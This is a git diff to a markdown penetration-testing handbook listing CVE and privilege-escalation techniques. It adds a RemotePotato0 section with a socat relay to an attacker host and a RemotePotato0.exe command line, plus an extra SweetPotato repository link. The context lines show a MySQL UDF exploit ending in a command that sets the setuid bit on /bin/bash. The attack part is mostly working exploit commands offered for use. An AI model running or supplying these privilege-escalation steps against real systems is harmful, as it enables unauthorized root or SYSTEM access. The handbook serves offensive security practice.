@@ -27,6 +27,7 @@
 - [CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
 - [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#MySQL-4x50-User-Defined-Function-UDF-Dynamic-Library-2-LPE)
+- [RemotePotato0 PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#RemotePotato0-PE)
 - [SharpEfsPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato-LPE)
 - [Shocker Container Escape](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shocker-Container-Escape)
 - [ThinkPHP < 6.0.14 Remote Code Execution RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#ThinkPHP--6014-Remote-Code-Execution-RCE)
@@ -138,6 +139,7 @@
 | n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
 | n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
 | n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
+| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
 | n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
 | n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
 | n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
@@ -1054,6 +1056,18 @@ $ mysql -u root
 > select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 > create function do_system returns integer soname 'raptor_udf2.so';
 > select do_system('chmod +s /bin/bash');
+```
+
+## RemotePotato0 PE
+
+> https://github.com/antonioCoco/RemotePotato0
+
+```c
+$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<RHOST>:<LPORT>
+```
+
+```c
+PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
 ```
 
 ## SharpEfsPotato LPE
